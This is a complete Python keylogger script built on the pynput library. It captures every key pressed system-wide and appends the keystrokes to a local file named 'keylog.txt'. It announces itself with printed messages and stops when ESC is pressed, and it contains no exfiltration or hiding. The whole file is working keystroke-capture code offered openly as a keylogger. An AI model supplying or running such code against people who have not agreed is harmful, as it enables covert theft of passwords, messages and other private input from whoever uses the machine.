from pynput import keyboard

# Log file to store the keystrokes
LOG_FILE = "keylog.txt"

def on_press(key):
    """
    This function will be triggered every time a key is pressed.
    It logs the keystrokes into the specified log file.
    """
    try:
        # Open the log file in append mode and write the pressed key
        with open(LOG_FILE, "a") as log_file:
            # For printable characters
            log_file.write(str(key.char))
    except AttributeError:
        # For special keys like space, shift, ctrl, etc.
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"[{key}]")

def on_release(key):
    """
    This function is triggered every time a key is released.
    You can use it to stop the keylogger on a certain keypress (e.g., ESC).
    """
    # Stop keylogger when ESC is pressed
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False

def main():
    print("Keylogger started. Press ESC to stop.")

    # Start the listener for capturing key events (system-wide)
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
